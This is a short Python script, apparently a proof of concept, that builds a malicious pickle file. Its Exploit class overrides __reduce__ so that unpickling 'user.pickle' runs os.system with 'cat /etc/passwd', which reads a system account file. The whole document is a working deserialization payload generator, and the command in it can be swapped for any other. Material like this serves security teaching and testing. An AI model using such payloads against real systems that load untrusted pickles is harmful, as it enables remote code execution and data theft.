import pickle


class Exploit(object):
    def __reduce__(self):
        import os
        return os.system, ("cat /etc/passwd",)


def create_payload():
    payload = Exploit()
    with open("user.pickle", "wb") as file:
        pickle.dump(payload, file)


if __name__ == '__main__':
    create_payload()
